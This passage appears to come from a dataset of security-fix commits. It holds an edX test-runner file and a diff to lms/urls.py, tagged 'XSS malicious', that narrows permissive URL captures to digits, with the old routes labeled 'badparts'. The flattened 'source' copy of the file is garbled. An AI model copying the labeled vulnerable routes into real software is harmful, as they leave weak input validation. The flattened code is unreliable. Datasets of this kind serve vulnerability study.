them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"}}, "msg": "Enable VERIFY_XSS checking by default."}}, "https://github.com/h4ppyy/m-mooc": {"4e4c209ae3deb4c78bcec89c181516af8604b450": {"url": "https://api.github.com/repos/h4ppyy/m-mooc/commits/4e4c209ae3deb4c78bcec89c181516af8604b450", "html_url": "https://github.com/h4ppyy/m-mooc/commit/4e4c209ae3deb4c78bcec89c181516af8604b450", "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "add": 12, "remove": 12, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.html_index'),"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.html_index', name=\"html_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if 